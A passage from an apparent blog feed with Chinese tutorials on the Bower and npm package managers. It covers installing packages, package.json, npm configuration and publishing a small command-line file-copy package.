    <published>2016-10-09T16:00:00.000Z</published>
    <updated>2018-06-06T02:32:55.170Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://bower.io/" target="_blank" rel="noopener">Bower</a> 是一个基于 Node 针对浏览器端的包管理工具。</p><p>Bower基于node.js，所以安装之前，必须先确保已安装node.js：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>使用 Bower 下载包的时候，也可以通过项目的 github 仓库地址进行下载安装，所以 Bower 也依赖于 git 环境，安装前需要确认是否有 git 环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br></pre></td></tr></table></figure><p>确认有了 Node 和 git 两个环境之后，就可以使用 npm 安装 bower 了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --global bower</span><br></pre></td></tr></table></figure><p>安装成功以后，可以通过输入 <code>bower help</code> 命令查看 bower 的使用帮助：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower help</span><br></pre></td></tr></table></figure><p>下面的命令可以更新或卸载 Bower：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 重新安装就是更新，或者使用 npm update --global bower</span><br><span class="line">$ npm install --global bower</span><br><span class="line"># 卸载</span><br><span class="line">$ npm uninstall --global bower</span><br></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><a id="more"></a><h3 id="初始化-bower-json-文件"><a href="#初始化-bower-json-文件" class="headerlink" title="初始化 bower.json 文件"></a>初始化 <code>bower.json</code> 文件</h3><p>在项目根目录下，运行下面的命令，进行初始化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower init</span><br></pre></td></tr></table></figure><p>通过回答几个问题，就会自动生成 bower.json 文件。这是bower管理工具的配置文件，下面是一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;docs&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;bower包管理工具演示&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;authors&quot;: [</span><br><span class="line">    &quot;lpz &lt;mail@lipengzhou.com&gt; (http://www.lipengzhou.com/)&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class="line">  &quot;homepage&quot;: &quot;&quot;,</span><br><span class="line">  &quot;ignore&quot;: [</span><br><span class="line">  ],</span><br><span class="line">  &quot;dependencies&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安装、更新、卸载"><a href="#安装、更新、卸载" class="headerlink" title="安装、更新、卸载"></a>安装、更新、卸载</h3><p>安装之前可以通过：<a href="https://bower.io/search/" target="_blank" rel="noopener">https://bower.io/search/</a> 在线搜索，搜索可用的包。</p><p>bower install 命令用于安装某个库，需要指明库的名字:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower install [--save] 包名</span><br></pre></td></tr></table></figure><p>Bower会使用库的名字，去在线索引中搜索该库的网址。某些情况下，如果一个库很新，可能需要我们手动指定该库的网址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ bower install [--save] https://github.com/lepture/editor.git</span><br><span class="line">$ bower install [--save] https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.js</span><br></pre></td></tr></table></figure><p>上面的命令说明，指定的网址可以是 github 地址、http 网址等。</p><p>Bower 默认会下载到当前项目根路径下的 <code>bower_components</code> 目录。</p><p>如果某个库依赖另一个库，安装时默认将所依赖的库一起安装。比如，bootstrap 依赖 jQuery，安装时会连 jQuery 一起安装。</p><p>默认情况下，会安装该库的最新版本，但是也可以手动指定版本号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower install jquery#1.12.1</span><br></pre></td></tr></table></figure><p>bower update 用于更新一个库，将其更新为最新版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower update jquery</span><br></pre></td></tr></table></figure><p>如果不给出库名，则更新所有库。</p><p>卸载指定库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower uninstall [--save] 包名</span><br></pre></td></tr></table></figure><p>注意，默认情况下会连所依赖的库一起卸载。</p><p>比如，bootstrap 依赖 jquery，卸载时会连 jquery 一起卸载，除非还有别的库依赖 jquery。</p><h3 id="缓存和离线"><a href="#缓存和离线" class="headerlink" title="缓存和离线"></a>缓存和离线</h3><p>查看所有缓存包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower cache list</span><br></pre></td></tr></table></figure><p>从缓存安装指定包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower install [--save] 包名 --offline</span><br></pre></td></tr></table></figure><p>清楚缓存中指定包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower cache clean 包名</span><br></pre></td></tr></table></figure><p>清除缓存中所有的包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bower cache clean list</span><br></pre></td></tr></table></figure><h3 id="查看通过-bower-安装的依赖"><a href="#查看通过-bower-安装的依赖" class="headerlink" title="查看通过 bower 安装的依赖"></a>查看通过 bower 安装的依赖</h3><p><code>bower list</code> 或 <code>bower ls</code> 命令，用于列出项目所使用的所有库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ bower list</span><br><span class="line"># 或者</span><br><span class="line">$ bower ls</span><br></pre></td></tr></table></figure><h2 id="配置文件-bowerrc"><a href="#配置文件-bowerrc" class="headerlink" title="配置文件 .bowerrc"></a>配置文件 <code>.bowerrc</code></h2><p>在项目的根目录下的 <code>.bowerrc</code>文件是 Bower 的配置文件，可以用来配置使用 Bower 安装包的指定目录等信息，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;directory&quot;: &quot;js/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要经过上了上面的配置，则安装包的时候，会将依赖项放到配置的路径中。</p><p>默认下载到了 bower-components 中。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://bower.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Bower&lt;/a&gt; 是一个基于 Node 针对浏览器端的包管理工具。&lt;/p&gt;
&lt;p&gt;Bower基于node.js，所以安装之前，必须先确保已安装node.js：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ node -v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 Bower 下载包的时候，也可以通过项目的 github 仓库地址进行下载安装，所以 Bower 也依赖于 git 环境，安装前需要确认是否有 git 环境：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ git --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;确认有了 Node 和 git 两个环境之后，就可以使用 npm 安装 bower 了：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ npm install --global bower&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;安装成功以后，可以通过输入 &lt;code&gt;bower help&lt;/code&gt; 命令查看 bower 的使用帮助：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ bower help&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;下面的命令可以更新或卸载 Bower：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 重新安装就是更新，或者使用 npm update --global bower&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ npm install --global bower&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 卸载&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ npm uninstall --global bower&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;基本使用&quot;&gt;&lt;a href=&quot;#基本使用&quot; class=&quot;headerlink&quot; title=&quot;基本使用&quot;&gt;&lt;/a&gt;基本使用&lt;/h2&gt;
    
    </summary>
    
      <category term="Web Development Tools" scheme="http://yoursite.com/categories/Web-Development-Tools/"/>
    
    
      <category term="Bower" scheme="http://yoursite.com/tags/Bower/"/>
    
      <category term="tools" scheme="http://yoursite.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>npm, Node Package Manager</title>
    <link href="http://yoursite.com/2016/09/20/npm,%20Node%20Package%20Manager/"/>
    <id>http://yoursite.com/2016/09/20/npm, Node Package Manager/</id>
    <published>2016-09-19T16:00:00.000Z</published>
    <updated>2018-06-06T02:20:54.607Z</updated>
    
    <content type="html"><![CDATA[<p>包其实就是一些模块组织到一起，放到一个目录中的一个称呼，叫包或者模块都行。Node Package Manager: npm 是一个用来安装和管理Node包和前端包的一个工具</p><h2 id="npm-有两层含义："><a href="#npm-有两层含义：" class="headerlink" title="npm 有两层含义："></a>npm 有两层含义：</h2><ul><li><a href="https://www.npmjs.com/" target="_blank" rel="noopener">npm 官方网站</a><ul><li>提供了一个用来共性或者检索的一个平台</li><li>一是托管 node 环境或者浏览器环境用的的一些第三方包</li></ul></li><li>是一个命令行管理工具，可以用来下载 npm 网站上托管的包<ul><li>CLI: Command Line Interface 命令行窗口</li><li>GUI: 图形化界面</li></ul></li></ul><a id="more"></a><h2 id="安装-npm"><a href="#安装-npm" class="headerlink" title="安装 npm"></a>安装 npm</h2><p>Node 是一个执行环境，Node 可以用来执行 JavaScript 代码，（这里的JS指的是 ECMAScript），npm 基于 node 环境的 API（网络操作API、文件操作API）编写的工具，可以用来下载第三方包到指定的目录中。</p><p>必须要安装 node 环境，测试是否有 node 环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>安装node环境的时候，已经自动安装了 npm 命令行工具，不需要单独安装。可以通过 <code>npm -v</code> 测试npm是否可用</p><h2 id="npm-基本使用"><a href="#npm-基本使用" class="headerlink" title="npm 基本使用"></a>npm 基本使用</h2><h3 id="本地安装"><a href="#本地安装" class="headerlink" title="本地安装"></a>本地安装</h3><p>一般是在项目中，安装项目使用的依赖包，例如 underscore、less、jQuery，可以在终端中，切换到项目的根目录，然后执行 <code>npm install 包名</code>，比如：<code>npm install jquerynpm</code> 工具会自动将 jQuery 这个包下载，然后放到 <code>node_modules</code> 目录中。node_modules 目录如果不存在会新建，如果已存在，则直接将下载的包放到该目录中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install [--save] 包名</span><br></pre></td></tr></table></figure><p>这行命令跟包说明文件<code>package.json</code> 有千丝万缕的关系</p><h3 id="包说明文件：package-json"><a href="#包说明文件：package-json" class="headerlink" title="包说明文件：package.json"></a>包说明文件：package.json</h3><p>包说明文件其实就是一个产品的说明书：<code>package.json</code> 文件。该文件一般只存在于项目的根路径下，定义了这个项目所需要的各种模块，以及项目的配置信息（比如名称、版本、依赖项等信息）。可以通过 <code>npm init [-y]</code> 命令使用向导的形式创建该文件。</p><p>该文件中描述了项目的一些元数据，例如 <code>name、version、author</code> 等信息。</p><p>其中有一个非常重要的属性，叫做：<code>dependencies</code>，该属性是一个对象，里面保存了当前项目的依赖项，该字段一般不要手动修改，它需要结合 <code>npm install --save 包名</code> 来使用，只要在安装的时候加上 <code>--save</code> 参数就会自动将包依赖项添加到该属性中，很方便。</p><p>甚至还可以完全把 <code>node_modules</code> 目录删除掉，只要 <code>package.json</code> 文件还在，就可以执行 npm install 安装包说明文件中的所有的依赖项。执行 <code>npm install</code> 命令的时候，它会自动查询当前目录下的 <code>package.json</code> 文件，然后找到里面的 <code>dependencies</code> 属性，依次下载到 <code>node_modules</code> 目录下。</p><p>建议：以后使用 npm 的时候，首先用 <code>npm init -y</code> 初始化一个 <code>package.json</code>， 然后使用 <code>npm install 包名 --save</code></p><p>总的来讲，有以下几个步骤，重要组成：</p><ul><li><code>npm init [-y]</code><ul><li>生成 package.json 文件</li></ul></li><li>main<ul><li>用来指定加载的时候的入口模块的</li></ul></li><li>dependencies<ul><li>当前项目或者说包的依赖项</li><li>npm install 的时候，会自动查找当前目录下的 package.json 文件中的 dependencies 属性</li><li>然后依次下载</li></ul></li></ul><h3 id="本地安装常用命令"><a href="#本地安装常用命令" class="headerlink" title="本地安装常用命令"></a>本地安装常用命令</h3><ul><li><code>cd Desktop\code</code></li><li><code>npm init</code></li><li><code>cls</code> 清屏</li><li><code>npm install bootstrap --save</code></li><li><code>npm install --save jquery</code></li><li><code>npm install</code></li></ul><h3 id="全局安装"><a href="#全局安装" class="headerlink" title="全局安装"></a>全局安装</h3><p>全局安装： 一般用于安装一些命令行工具（这些工具也是基于Node开发的）全局安装使用 <code>npm install --global 包名（工具名）</code>，在任意目录执行该命令都可以。</p><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g less</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g less</span><br></pre></td></tr></table></figure><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ul><li><code>npm help</code> 查看 npm 命令列表</li><li><code>npm -l</code> 查看各个命名的简单用法</li><li><code>npm -v</code> 查看 npm 的版本</li><li><code>npm root -g</code> 查看全局包安装目录。</li><li><code>npm init [-y]</code>：初始化一个 package.json 文件</li><li><code>npm info 包名 [字段名]</code>：查看指定模块的 package.json 信息</li><li><code>npm search 包名</code>：该命令用于搜索 npm 仓库</li><li><code>npm list</code> 以树型结构列出当前项目安装的所有模块，以及它们依赖的模块</li><li><code>npm list 包名</code>：列出单个模块</li><li><code>npm list -g</code>: 列出全局安装的模块</li><li><code>npm install [--save] 包名[#版本号]</code><ul><li><code>npm install 包名</code> 安装包到当前项目下的 node_modules 目录下</li><li><code>npm install|i --save|-S 包名</code> 安装包的同时把依赖项保存到 包说明文件中</li><li>本地项目安装：目的是为了辅助你的代码功能开发</li></ul></li><li><code>npm uninstall [--save] 包名</code><ul><li><code>npm uninstall 包名</code> 删除包，但是如果包说明文件中有依赖项，那么不会删除</li></ul></li><li><code>npm uninstall --save 包名</code> 删除包，同时将 package.json 文件中的依赖项也删除</li><li><code>npm install</code></li><li><code>npm install -g 包名</code><ul><li>全局安装：一般用于安装命令行中的 CLI 工具</li></ul></li><li><code>npm uninstall -g 包名</code></li><li><code>npm install -g http-server --registry=http://192.168.32.59:7001</code> 设置服务器镜像源地址</li><li><code>npm config</code><ul><li><code>npm config list</code> 查看 npm 配置项</li><li><code>npm config set init.author.name $name</code> 使用 npm init 时，默认的 name</li><li><code>npm config set init.author.email $email</code> 使用 npm init 时，默认的 email</li><li><code>npm congig set prefix &quot;路径&quot;</code> 改变全局包安装路径</li><li><code>npm config set registry</code> “镜像路径”</li></ul></li><li><code>http-server</code> 开启服务器</li><li><code>http-server-o</code> 开启服务器并直接在浏览器中打开</li></ul><h2 id="启动一个服务器"><a href="#启动一个服务器" class="headerlink" title="启动一个服务器"></a>启动一个服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g http-server</span><br></pre></td></tr></table></figure><p>然后需要打开文件的目录下，打开终端：输入 <code>http-server</code>，这样启动了默认端口是 8080，<code>http-server -p 6060</code> 指定服务器的端口。</p><h2 id="如何将包发布到-npm-网站上并且通过-npm-install-–global-包名-安装"><a href="#如何将包发布到-npm-网站上并且通过-npm-install-–global-包名-安装" class="headerlink" title="如何将包发布到 npm 网站上并且通过 npm install –global 包名 安装"></a>如何将包发布到 npm 网站上并且通过 npm install –global 包名 安装</h2><h3 id="配置原理"><a href="#配置原理" class="headerlink" title="配置原理"></a>配置原理</h3><ul><li><code>npm root -g</code></li><li>模拟该目录下 nrm 下的 cli.js (入口文件) 文件中，在第一行加入了 <code>#!/usr/bin/env node</code></li><li>得到路径：<code>C:\Users\mhq\AppData\Roaming\npm\node_modules</code></li><li>在此路径下新建 以 需要发布的包的包名命名的文件： 比如 <code>mCopy</code>;</li><li>将所需要发布的 js 文件放到这个文件下， 比如 <code>08_copy.js</code>;</li><li>在该文件的上一级目录下，<code>C:\Users\mhq\AppData\Roaming\npm</code>下，复制一个 nrm.cmd 副本</li><li>重命名该副本文件为 <code>mCopy.cmd</code>, 现在这个文件长这样：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@IF EXIST &quot;%~dp0\node.exe&quot; (</span><br><span class="line">  &quot;%~dp0\node.exe&quot;  &quot;%~dp0\node_modules\nrm\cli.js&quot; %*</span><br><span class="line">) ELSE (</span><br><span class="line">  @SETLOCAL</span><br><span class="line">  @SET PATHEXT=%PATHEXT:;.JS;=;%</span><br><span class="line">  node  &quot;%~dp0\node_modules\nrm\cli.js&quot; %*</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>配置完这一步之后就可以在 cmd 中直接使用 mCopy src des 命令来复制文件了</p><h3 id="node-提供了一个更方便的方式自动生成-cmd-文件以及和需要发布的文件产生关联"><a href="#node-提供了一个更方便的方式自动生成-cmd-文件以及和需要发布的文件产生关联" class="headerlink" title="node 提供了一个更方便的方式自动生成 .cmd 文件以及和需要发布的文件产生关联"></a>node 提供了一个更方便的方式自动生成 .cmd 文件以及和需要发布的文件产生关联</h3><ul><li>现在将原理中介绍的过程产生的文件删除，重新使用 Node 方式配置</li><li>在桌面新建 <code>mCopy</code> 文件</li><li>win+R –&gt; cmd –&gt; cd Desktop –&gt; cd mCopy</li><li>新建一个 .js 的入口文件，在第一行加入了 <code>#!/usr/bin/env node</code>，这叫设绑；<ul><li>这个标记在 Linux 或 Unix 操作系统上</li></ul></li><li>在 package.json 文件中加入 bin 字段，<ul><li>bin 字段是一个对象</li><li>该对象的第一个属性就是执行脚本文件的命令， 比如 “mCopy”，用来生成 .cmd 文件</li><li>该对象的第一个属性的值就是要执行的脚本文件</li></ul></li></ul><p>package.json 文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;mcopy&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;bin&quot;: &#123;</span><br><span class="line">    &quot;mcopy&quot;: &quot;./index.js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;keywords&quot;: [],</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>最后，打开终端，进入当前项目的根路径，执行：<code>npm link</code><ul><li>执行完该命令之后， node 会自动去全局安装创建路径对应的 .cmd 文件</li><li>这样就开发了命令行工具</li><li>如果想卸载掉，使用命令 <code>npm unlink</code></li><li>新建一个 .js 文件，将需要发布的包的代码放进去；比如：copy.js<br><code>copy.js</code>文件</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;);</span><br><span class="line">// 暴露接口</span><br><span class="line">module.exports = function (src, des, callback) &#123;</span><br><span class="line">    fs.readFile(src, (err, data) =&gt; &#123;</span><br><span class="line">        if (err) &#123;</span><br><span class="line">            return callback(err);</span><br><span class="line">        &#125;</span><br><span class="line">        fs.writeFile(des, data, err =&gt; &#123;</span><br><span class="line">            return callback(err);</span><br><span class="line">        &#125;);</span><br><span class="line">        callback(null);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>index.js 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env node</span><br><span class="line">const copy = require(&apos;./copy&apos;);</span><br><span class="line">const args = process.argv.slice(2);</span><br><span class="line">console.log(args);</span><br><span class="line">copy(args[0], args[1], err =&gt; &#123;</span><br><span class="line">  if (err) &#123;</span><br><span class="line">    return console.log(&apos;Copy Fail&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(&apos;Copy Success&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>发布<ul><li>发布之前先去 npmjs.com 上验证一下你的 package.json 中的 name 是否被占用</li><li>如果被占用，则修改 name</li><li>注意：改了名字之后就无法卸载。<ul><li>一种方式是直接删掉</li><li>一种方式是把 package.json 文件下的 name 改回原来的然后再使用 <code>npm unlink</code> 卸载</li><li>然后把 name 改成线上没有的名字</li></ul></li></ul></li><li>去 <a href="https://www.npmjs.com" target="_blank" rel="noopener">https://www.npmjs.com</a> 官网注册一个账号，或者通过 npm adduser 注册一个账户</li><li>注意：这里一定要确保使用的镜像源地址是 npm 官方的镜像源</li><li><code>npm login</code> 登陆</li><li><code>npm publish</code> 发布</li><li>支持 README.md 文档<ul><li>添加文档之后再发布</li><li>需要更新 package.json 中的版本号</li><li>修改 package.json 下的 <code>&quot;description&quot;</code> 为 “A copy tool of a command line”,`</li></ul></li><li><code>npm version patch</code> 更新</li><li><code>npm install -g hqcopy</code> 全局安装到本地</li><li><code>npm unpublish</code> 删除</li></ul><h3 id="Install-说明文档-README-md"><a href="#Install-说明文档-README-md" class="headerlink" title="Install 说明文档 README.md"></a>Install 说明文档 README.md</h3><p>h1 hqcopy</p><p>h2 Install</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --global mcopy</span><br></pre></td></tr></table></figure><p>h3 Usage</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mcopy src des</span><br></pre></td></tr></table></figure><h3 id="将这个包改造为本地和全局两种形式"><a href="#将这个包改造为本地和全局两种形式" class="headerlink" title="将这个包改造为本地和全局两种形式"></a>将这个包改造为本地和全局两种形式</h3><p>作为命令行 和 项目安装</p><p>即：在命令行中执行的是： index.js，而在代码中执行的是： copy.js，因此，有以下操作：</p><ul><li>将 package.json 包下的 “main” 改成 “copy.js”</li><li>将已上传的 hqcopy 下载到本地项目中，</li><li>打开之后发现 package.json 文件中的 main 属性是 “index.js”</li><li>当前项目下 新建 .js 文件, 然后使用下面代码引入，目前只限错误</li><li>因为目前只能当做命令行使用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const hqcopy = require(&apos;hqcopy&apos;);</span><br></pre></td></tr></table></figure><ul><li>加载机制，首先去当前项目的 node_modules,</li><li>找到 hqcopy，</li><li>找到 package.json 文件</li><li>找到 main 属性，发现是 index.js</li><li>应当判断是全局命令行调用，还是代码调用</li><li>修改 package.json 文件的 <code>main</code> 属性为 copy.js, 这样，如果是代码调用，默认调用 copy.js文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;hqcopy&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.2&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;A copy tool of a command line&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;copy.js&quot;,</span><br><span class="line">  &quot;bin&quot;: &#123;</span><br><span class="line">    &quot;mcopy&quot;: &quot;./index.js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;keywords&quot;: [],</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>npm version patch</li><li>npm publish</li></ul><p>新建 test.js 进行测试</p><ul><li><code>npm install --save hqcopy</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 